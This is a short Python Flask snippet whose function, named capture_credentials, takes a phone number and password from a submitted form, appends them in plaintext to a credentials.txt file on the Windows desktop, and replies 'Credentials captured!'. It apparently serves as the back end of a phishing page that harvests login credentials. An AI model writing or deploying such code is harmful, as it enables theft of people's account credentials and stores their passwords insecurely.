import os
from flask import request

def capture_credentials():
    phone = request.form['phone']
    password = request.form['password']

    # Save credentials to a file on the desktop
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    file_path = os.path.join(desktop_path, "credentials.txt")
    with open(file_path, "a") as f:
        f.write(f"Phone: {phone}, Password: {password}\n")

    return "Credentials captured!"